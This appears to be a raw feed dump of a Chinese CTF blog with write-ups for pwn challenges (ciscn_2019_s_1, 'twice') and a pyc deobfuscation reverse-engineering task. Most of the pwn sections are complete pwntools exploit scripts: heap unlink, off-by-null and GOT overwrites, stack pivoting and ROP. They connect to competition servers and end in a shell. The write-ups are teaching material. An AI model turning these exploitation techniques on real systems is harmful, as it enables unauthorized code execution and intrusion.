:io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(data))add(<span class="hljs-number">16</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'sasdasdas'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x121</span>) + p64(<span class="hljs-number">0x000000000602010</span>))add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaa'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">' '</span>)free(<span class="hljs-number">5</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(elf.plt[<span class="hljs-string">'puts'</span>]))free(<span class="hljs-number">7</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec120</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">4</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(libc.sym[<span class="hljs-string">'system'</span>] + libc_base))add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><p>由于其确定堆块的特殊性，在申请堆块到free got时，因为其在<code>0x000000000602018</code>，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到<code>0x000000000602010</code> 就OK了。</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>保护：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在<code>0x7f - 0x100</code>。</p><p>edit函数：</p><div class="hljs"><pre><code class="hljs c">v0[read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)heap[v2], (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)len[v2])] = <span class="hljs-number">0</span>;</code></pre></div><p>明显存在着off by null。且有key1控制着，只能编辑2次。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( key1 == <span class="hljs-number">2</span> )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</code></pre></div><p>Show函数：<br>Key2有值才能用。</p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul><li>由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制.</li></ul><p>剩下的就很简单了。</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_s_1'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',29756)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,data):    sla('show\n','1')    sla('dex',str(idx))    sla('size',str(size))    sa('content',str(data))def free(idx):    sla('show\n','2')    sla('dex',str(idx))def edit(idx,data):    sla('show\n','3')    sla('dex',str(idx))    sa('content',str(data))def show(idx):    sla('show\n','4')    sla('dex',str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,'aaaaaaaa')add(7,0xf8,"aaaa")#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,"aaaa")add(9,0xf8,"aaaa")add(10,0x88,'aaaa')for i in range(7):    free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存payload = 'a' * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + '\x00'  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,' ')show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“第五空间” 智能安全大赛-twice</title>
    <link href="/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <url>/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="“第五空间”-智能安全大赛"><a href="#“第五空间”-智能安全大赛" class="headerlink" title="“第五空间” 智能安全大赛"></a>“第五空间” 智能安全大赛</h1><p>比赛时当天有考试，就做了个签道题。</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="查保护"><a href="#查保护" class="headerlink" title="查保护"></a>查保护</h3><div class="hljs"><pre><code class="hljs python">Arch:     amd64<span class="hljs-number">-64</span>-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><ul><li>程序可以给你2次的读操作，第一次读89字节，第二次读112字节</li><li>栈大小是<code>0x60</code>，存在栈溢出。</li></ul><div class="hljs"><pre><code class="hljs python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f ("/media/psf/mypwn/no5space/pwn")0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre></div><ul><li>调试发现第一次read，可以leak canary 和一个栈地址，从而可以根据偏移算出栈上其他有用的地址。</li><li>第二次，需要填充一下canary，然后可以去攻击ret address</li></ul><p>但是，并没有拿到libc的地址，是无法拿到shell。<strong>由于可以溢出的字节有限，也没法进行rop。</strong></p><h3 id="获取libc地址"><a href="#获取libc地址" class="headerlink" title="获取libc地址"></a>获取libc地址</h3><p>此时，根据前面泄漏的栈地址，可以算出read函数的buf栈地址，然后<strong>栈迁移</strong>上去，然后进行rop来leak 出libc地址。</p><p>拿到libc地址以后，rop的终结地址为程序的<code>start</code>。让其清理栈，再次进行程序的漏洞利用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'121.36.59.116'</span>,<span class="hljs-number">9999</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">"1"</span> * <span class="hljs-number">0x57</span> + <span class="hljs-string">'a'</span>sla(<span class="hljs-string">"&gt;"</span>,payload)ru(<span class="hljs-string">'a'</span>)canary = uu64(r(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x0a</span>print(hex(canary))s_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x70</span>print(hex(s_base))  pop_rsi_pop_r15_ret = <span class="hljs-number">0x0000000000400921</span>pop_rbp_ret = <span class="hljs-number">0x0000000000400690</span>pop_rdi_ret = <span class="hljs-number">0x0000000000400923</span>leave_ret = <span class="hljs-number">0x0000000000400879</span>rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)<span class="hljs-comment"># debug()</span>sa(<span class="hljs-string">"&gt;"</span>,payload)r(<span class="hljs-number">1</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'1'</span>)rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[<span class="hljs-number">1</span>]) + p64(libc_base+rce16[<span class="hljs-number">1</span>])sla(<span class="hljs-string">"&gt;"</span>,payload)itr()</code></pre></div><ul><li>注意在第二次发送payload不要发出去换行符。</li><li>最后一次payload 中的rop什么的都是抄第一次的payload，只是把最后的ret address 改成 one gadget 。（只是填充字节用的）</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF安恒月赛(6th)</title>
    <link href="/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <url>/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p><h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><div class="hljs"><pre><code class="hljs undefined">In [1]: import dis,marshalIn [2]: f=open('1.pyc')In [3]: f.read(4)Out[3]: '<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>'In [4]: f.read(4)Out[4]: 'jv<span class="hljs-symbol">\x</span>e7^'In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=', 'Are u ready?', 0, 32, 'a', '', 'great!waht u input is the flag u wanna get.', 'pity!')In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:('base64', 'a', 'raw_input', 'flag', 'b64encode', 'c', 'list', 'd', 'range', 'i', 'join', 'ohh')In [9]: code.co_codeOut[9]: "q<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00q<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>06d<span class="hljs-symbol">\x</span>ffd<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00l<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00x'<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00D]<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00c<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>19d<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>007<span class="hljs-symbol">\x</span>03&lt;qI<span class="hljs-symbol">\x</span>00Wd<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00k<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00r<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00GHn<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00GHd<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00S"</code></pre></div><h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">10</span>]: dis.dis(code.co_code)          <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>    &gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>          <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)          <span class="hljs-number">9</span> STOP_CODE         <span class="hljs-number">10</span> STOP_CODE         <span class="hljs-number">11</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">14</span> IMPORT_NAME         <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">17</span> STORE_NAME          <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">20</span> LOAD_CONST          <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">23</span> STORE_NAME          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">26</span> LOAD_NAME           <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">29</span> LOAD_CONST          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">32</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">35</span> STORE_NAME          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">38</span> LOAD_NAME           <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">41</span> LOAD_ATTR           <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">44</span> LOAD_NAME           <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">47</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">50</span> STORE_NAME          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">53</span> LOAD_NAME           <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)         <span class="hljs-number">56</span> LOAD_NAME           <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">59</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">62</span> STORE_NAME          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">65</span> SETUP_LOOP         <span class="hljs-number">39</span> (to <span class="hljs-number">107</span>)         <span class="hljs-number">68</span> LOAD_NAME           <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)         <span class="hljs-number">71</span> LOAD_CONST          <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">74</span> LOAD_CONST          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">77</span> CALL_FUNCTION       <span class="hljs-number">2</span>         <span class="hljs-number">80</span> GET_ITER         <span class="hljs-number">81</span> FOR_ITER           <span class="hljs-number">22</span> (to <span class="hljs-number">106</span>)         <span class="hljs-number">84</span> STORE_NAME          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">87</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">90</span> LOAD_NAME           <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">93</span> DUP_TOPX            <span class="hljs-number">2</span>         <span class="hljs-number">96</span> BINARY_SUBSCR         <span class="hljs-number">97</span> LOAD_CONST          <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)        <span class="hljs-number">100</span> INPLACE_ADD        <span class="hljs-number">101</span> ROT_THREE        <span class="hljs-number">102</span> STORE_SUBSCR        <span class="hljs-number">103</span> JUMP_ABSOLUTE      <span class="hljs-number">73</span>    &gt;&gt;  <span class="hljs-number">106</span> POP_BLOCK    &gt;&gt;  <span class="hljs-number">107</span> LOAD_CONST          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">110</span> LOAD_ATTR          <span class="hljs-number">10</span> (<span class="hljs-number">10</span>)        <span class="hljs-number">113</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">116</span> CALL_FUNCTION       <span class="hljs-number">1</span>        <span class="hljs-number">119</span> STORE_NAME         <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">122</span> LOAD_NAME          <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">125</span> LOAD_NAME           <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">128</span> COMPARE_OP          <span class="hljs-number">2</span> (==)        <span class="hljs-number">131</span> POP_JUMP_IF_FALSE   <span class="hljs-number">134</span>    &gt;&gt;  <span class="hljs-number">134</span> LOAD_CONST          <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)        <span class="hljs-number">137</span> PRINT_ITEM        <span class="hljs-number">138</span> PRINT_NEWLINE        <span class="hljs-number">139</span> JUMP_FORWARD        <span class="hljs-number">5</span> (to <span class="hljs-number">147</span>)        <span class="hljs-number">142</span> LOAD_CONST          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)        <span class="hljs-number">145</span> PRINT_ITEM        <span class="hljs-number">146</span> PRINT_NEWLINE    &gt;&gt;  <span class="hljs-number">147</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">150</span> RETURN_VALUE</code></pre></div><p>这里面需要注意的就是开头的：</p><div class="hljs"><pre><code class="hljs undefined">      <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>&gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>      <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)      <span class="hljs-number">9</span> STOP_CODE     <span class="hljs-number">10</span> STOP_CODE</code></pre></div><p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)<span class="hljs-symbol">1 </span>LOAD_CONST <span class="hljs-number">1</span>(<span class="hljs-number">1</span>)</code></pre></div><p>其中这种二进制字节码对应的翻译结果：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x64</span> 操作为LOAD_CONST，用法举例：LOAD_CONST <span class="hljs-number">1</span>        HEX: <span class="hljs-number">640100</span><span class="hljs-number">0x71</span> 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE <span class="hljs-number">14</span>                HEX: <span class="hljs-number">710e00</span><span class="hljs-number">0x65</span> 操作为LOAD_NAME，用法举例：LOAD_NAME <span class="hljs-number">1</span>                HEX: <span class="hljs-number">650100</span></code></pre></div><p>所以寻找：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)</code></pre></div><p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE       <span class="hljs-number">3</span></code></pre></div><p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>那很明显混淆字段就是：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>然后用工具删除即可，其中0x97就是<code>co_code</code></p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">12</span>]: <span class="hljs-function"><span class="hljs-title">len</span>(<span class="hljs-variable">code</span>.co_code)</span><span class="hljs-variable">Out</span>[<span 